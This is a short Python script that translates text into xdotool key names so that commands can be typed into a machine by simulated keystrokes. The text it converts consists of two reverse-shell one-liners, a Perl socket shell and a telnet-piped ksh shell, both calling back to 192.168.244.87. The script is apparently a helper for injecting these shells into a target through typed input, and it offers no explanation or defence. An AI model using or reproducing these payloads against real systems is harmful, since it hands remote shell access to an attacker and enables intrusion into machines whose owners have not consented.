#./xdotool key ... KP_Enter

keyspace = {' ':'space', '!':'exclam', '"':'quotedbl', '#':'numbersign', '$':'dollar', '%':'percent', '&':'ampersand', '\'':'quoteright', '(':'parenleft', ')':'parenright', '[':'bracketleft', '*':'asterisk', '\\':'backslash', '+':'plus', ']':'bracketright', ',':'comma', '^':'asciicircum', '-':'minus', '_':'underscore', '.':'period', '`':'quoteleft', '/':'slash', ':':'colon', ';':'semicolon', '<':'less', '=':'equal', '>':'greater', '?':'question', '@':'at', '{':'braceleft', '|':'bar', '}':'braceright', '~':'asciitilde'}

def string_to_xdo(st):
	if (len(st) == 0):
		return 'Return'
	st = list(st)
	out = ''
	for ch in st:
		if ch in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890':
			out += ch + ' '
		else:
			out += keyspace[ch] + ' '


	return out
convertThis = """perl -e 'use Socket;$i="192.168.244.87";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
convertThis = """telnet 192.168.244.87 8080 | /usr/bin/ksh | telnet 192.168.244.87 8081"""
print(string_to_xdo(convertThis))
